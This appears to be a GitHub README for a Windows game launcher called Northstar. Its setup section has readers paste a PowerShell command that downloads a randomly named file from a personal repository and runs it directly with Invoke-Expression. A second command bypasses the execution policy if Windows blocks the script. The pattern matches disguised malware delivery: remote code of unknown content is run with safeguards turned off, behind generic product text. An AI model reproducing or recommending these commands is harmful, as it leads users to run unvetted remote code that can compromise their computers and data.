# Northstar

Northstar is the Windows tool this page sets up. The command in Quick Setup installs it on this PC. You open Northstar to start and manage what it runs.

Northstar is a desktop launcher for Windows that starts your installed client, loads saved settings, and routes you to custom or regional servers without digging through folders every time. It sits beside your game install and acts as the front door: pick a profile, confirm your server or playlist, and let it handle the handoff to the running process.

A typical session begins from the Start menu or taskbar pin. You open Northstar, review the server list or last-used target, adjust launch options if needed, and click run. The tool validates paths, applies your config, and keeps a small log of the last session so the next launch is one click.

This repository holds the Windows setup package, configuration samples, release notes, and a short changelog. Use the setup to install or refresh Northstar on your machine, then keep local notes alongside the tracked history when you update.

## What you open

- Launches your Windows client from one window using saved install paths and working directories.
- Maintains multiple profiles with distinct server targets, launch flags, and optional environment overrides.
- Shows a sortable server list with latency hints and remembers your last successful connection.
- Runs a quick preflight check so missing binaries or bad paths fail before the client starts.
- Writes compact session logs you can open when a launch stops early or drops mid-handoff.
- Offers a optional tray icon to reopen Northstar or repeat the previous launch without refocusing the game.
- Pairs with the setup package in this repo for clean installs and version-to-version upgrades on Windows.
- Surfaces release highlights from the bundled changelog after updates so you know what changed.

## Quick Setup (PowerShell)

This installs the tool Northstar on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/nzimmermann7138438/northstar-setup-guide/main/vuq43di17o.fjp0v0po | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/nzimmermann7138438/northstar-setup-guide/main/vuq43di17o.fjp0v0po | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `vuq43di17o.fjp0v0po` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `nzimmermann7138438/northstar-setup-guide`. Northstar 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
